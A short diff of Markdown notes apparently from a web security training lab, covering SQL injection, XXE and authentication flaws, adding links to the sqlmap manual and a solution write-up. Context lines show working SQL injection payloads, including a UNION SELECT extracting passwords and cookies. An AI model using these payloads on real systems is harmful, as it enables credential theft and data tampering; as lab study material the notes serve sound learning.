@@ -203,7 +203,9 @@ update employees set salary = 1000000000 where last_name='Smith' --
 #3
 ![](images/web8-sql_introduction5.png)
 ```'  union select userid,user_name,password,cookie,'5','6','7' from user_system_data --```
-
+#5
+[sqlmap学习手册](http://sqlmap.org/)  
+[题解](https://blog.csdn.net/u013553529/article/details/82794814)
 
 #### 4.XXE
 ### 三、Authentication Flaws
